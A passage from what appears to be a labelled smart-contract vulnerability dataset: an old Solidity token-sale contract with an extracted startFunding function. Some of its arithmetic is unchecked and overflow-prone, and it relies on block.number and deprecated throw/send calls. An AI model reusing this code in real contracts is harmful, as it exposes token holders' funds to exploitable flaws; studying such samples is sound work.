totalSupply) throw;\n currentSupply = safeAdd(currentSupply, value);\n IncreaseSupply(value);\n }\n function decreaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + tokenRaised > currentSupply) throw;\n currentSupply = safeSubtract(currentSupply, value);\n DecreaseSupply(value);\n }\n function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\n if (isFunding) throw;\n if (_fundingStartBlock >= _fundingStopBlock) throw;\n if (block.number >= _fundingStartBlock) throw;\n fundingStartBlock = _fundingStartBlock;\n fundingStopBlock = _fundingStopBlock;\n isFunding = true;\n }\n function stopFunding() isOwner external {\n if (!isFunding) throw;\n isFunding = false;\n }\n function setMigrateContract(address _newContractAddr) isOwner external {\n if (_newContractAddr == newContractAddr) throw;\n newContractAddr = _newContractAddr;\n }\n function changeOwner(address _newFundDeposit) isOwner() external {\n if (_newFundDeposit == address(0x0)) throw;\n ethFundDeposit = _newFundDeposit;\n }\n function migrate() external {\n if(isFunding) throw;\n if(newContractAddr == address(0x0)) throw;\n uint256 tokens = balances[msg.sender];\n if (tokens == 0) throw;\n balances[msg.sender] = 0;\n tokenMigrated = safeAdd(tokenMigrated, tokens);\n IMigrationContract newContract = IMigrationContract(newContractAddr);\n if (!newContract.migrate(msg.sender, tokens)) throw;\n Migrate(msg.sender, tokens);\n }\n function transferETH() isOwner external {\n if (this.balance == 0) throw;\n if (!ethFundDeposit.send(this.balance)) throw;\n }\n function allocateToken (address _addr, uint256 _eth) isOwner external {\n if (_eth == 0) throw;\n if (_addr == address(0x0)) throw;\n uint256 tokens = safeMult(formatDecimals(_eth), tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[_addr] += tokens;\n AllocateToken(_addr, tokens);\n }\n function () payable {\n if (!isFunding) throw;\n if (msg.value == 0) throw;\n if (block.number < fundingStartBlock) throw;\n if (block.number > fundingStopBlock) throw;\n uint256 tokens = safeMult(msg.value, tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[msg.sender] += tokens;\n IssueToken(msg.sender, tokens);\n }\n}",
  "extract_feature": [
    "function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\nif (isFunding) throw;\nif (_fundingStartBlock >= _fundingStopBlock) throw;\nif (block.number >= _fundingStartBlock) throw;\nfundingStartBlock = _fundingStartBlock;\nfundingStopBlock = _fundingStopBlock;\nisFunding = true;\n}"
  ]
}]